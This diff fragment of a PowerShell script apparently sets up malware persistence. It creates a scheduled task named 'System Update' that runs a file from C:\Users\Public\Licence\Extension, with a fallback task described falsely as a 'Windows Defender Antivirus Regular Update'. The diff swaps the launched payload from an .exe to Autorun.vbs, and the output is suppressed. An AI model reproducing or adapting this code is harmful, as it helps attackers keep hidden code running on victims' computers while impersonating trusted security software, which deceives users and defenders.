@@ -32,11 +32,11 @@ if(!(Test-Path "C:\Users\Public\Licence\count.txt")) {
 
 
        try { 
-       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR "C:\Users\Public\Licence\Extension\folder.exe" /ST 23:55 | Out-Null
+       schtasks.exe /CREATE /F /SC DAILY /MO 1 /TN "System Update" /TR "C:\Users\Public\Licence\Extension\Autorun.vbs" /ST 23:55 | Out-Null
        }
        catch {
        $trigger = New-JobTrigger -once -At $(get-date) -RepetitionInterval $([timespan]::FromMinutes("10080")) -RepeatIndefinitely
-       $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Extension\folder.exe"
+       $action = New-ScheduledTaskAction -Execute "C:\Users\Public\Licence\Extension\Autorun.vbs"
        Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "System Update" -Description "Windows Defender Antivirus Regular Update." -Force
        }
   	
